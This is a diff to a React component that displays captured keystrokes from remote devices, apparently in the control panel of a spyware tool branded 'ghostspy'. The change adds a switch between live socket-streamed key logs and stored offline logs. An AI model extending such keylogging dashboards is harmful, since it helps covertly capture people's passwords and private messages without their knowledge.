@@ -1,23 +1,39 @@
 import React, { useState, useEffect } from "react";
 import { useTranslation } from "react-i18next";
-import { Typography, CircularProgress, Box } from "@mui/material";
+
+import { Typography, CardMedia, Box } from "@mui/material";
+import InputLabel from "@mui/material/InputLabel";
+import MenuItem from "@mui/material/MenuItem";
+import FormControl from "@mui/material/FormControl";
+import Select, { SelectChangeEvent } from "@mui/material/Select";
+
 import { useSocketFunctions } from "../../utils/socket";
 import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
 import { useSocket } from "../../hooks/use-socket";
 import MonitorViewer from "../monitorViewer";
 import Color from "src/theme/colors";
+import { getKeyLogs } from "src/store/actions/keylogs.action";
 
 const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
   const { t } = useTranslation();
   const { onSocketMonitor, onSocketCloseMonitor } = useSocketFunctions();
   const { socket } = useSocket();
 
+  const [option, setOption] = useState("online");
   const [changeLoading, setChangeLoading] = useState(false);
   const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);
 
+  const handleLogsOptionChange = (event) => {
+    setOption(event.target.value);
+  };
+
   useEffect(() => {
-    init();
-  }, []);
+    if (option == "online") {
+      init();
+    } else if (option == "offline") {
+      onStaticLogs();
+    }
+  }, [option]);
 
   const onKeyMonitorResponse = (data) => {
     const deviceId = device?.deviceId;
@@ -53,6 +69,17 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
     }
   };
 
+  // Static Key logs
+  const onStaticLogs = async () => {
+    try {
+      console.log({ device });
+      const deviceId = device?.deviceId;
+      const response = await getKeyLogs({ deviceId });
+    } catch (error) {
+      console.log(error);
+    }
+  };
+
   // Close the monitor modal
   const onCloseModal = async () => {
     try {
@@ -67,7 +94,7 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
   return (
     <MonitorViewer
       initialState={{
-        width: 600,
+        width: 700,
         height: 500,
         x: 50,
         y: -120,
@@ -79,13 +106,53 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
       onClose={onCloseModal}
     >
       <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
+        {/* Control Tool */}
+        <Box
+          sx={{
+            position: "absolute",
+            right: "-180px",
+            top: "0%",
+            backgroundColor: Color.background.secondary,
+            border: `solid 1px ${Color.background.purple}`,
+            borderRadius: "5px",
+            height: "100%",
+            py: 4,
+            px: 1,
+          }}
+        >
+          {" "}
+          <Typography
+            sx={{ fontSize: "14px", color: Color.text.primary, textAlign: "center", mb: 1 }}
+          >
+            {t("devicesPage.monitors.key-logs-option")}
+          </Typography>
+          <Box sx={{ width: "130px", minWidth: 127 }}>
+            <FormControl fullWidth>
+              <Select
+                displayEmpty
+                className="key-selection"
+                labelId="logs-select-label"
+                id="logs-select"
+                value={option}
+                onChange={handleLogsOptionChange}
+              >
+                <MenuItem value={"online"} sx={{ fontSize: "14px" }}>
+                  {t("devicesPage.monitors.key-real-time")}
+                </MenuItem>
+                <MenuItem value={"offline"} sx={{ fontSize: "14px" }}>
+                  {t("devicesPage.monitors.key-offline")}
+                </MenuItem>
+              </Select>
+            </FormControl>
+          </Box>
+        </Box>
+
         <Box
           sx={{
             display: "flex",
             flexDirection: "column",
             alignItems: "center",
             pt: 2,
-            position: "relative",
             width: "100%",
             height: "100%",
           }}
@@ -102,6 +169,7 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
               borderRadius: "5px",
             }}
           >
+            {/* Key Log Table Title */}
             <Box
               sx={{
                 display: "flex",
@@ -124,6 +192,7 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
                   {t("devicesPage.monitors.keyevent")}
                 </Typography>
               </Box>
+
               <Box sx={{ flex: 1 }}>
                 <Typography
                   component="h2"
@@ -149,6 +218,7 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
                 </Typography>
               </Box>
             </Box>
+            {/* Key Logs Panel */}
             <Box
               sx={{
                 backgroundColor: "black",
@@ -177,19 +247,17 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
                     width: "100%",
                   }}
                 >
-                  <Box
+                  <CardMedia
+                    className="screen-body"
+                    component="img"
+                    src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
                     sx={{
-                      display: "flex",
-                      justifyContent: "center",
-                      alignItems: "center",
-                      backgroundColor: "#564FEE",
-                      width: "30px",
-                      height: "30px",
-                      borderRadius: "5px",
+                      cursor: "default",
+                      width: "auto",
+                      height: "auto",
+                      borderRadius: "0px",
                     }}
-                  >
-                    <CircularProgress sx={{ color: "white" }} size={20} />
-                  </Box>
+                  />
                 </Box>
               )}
 
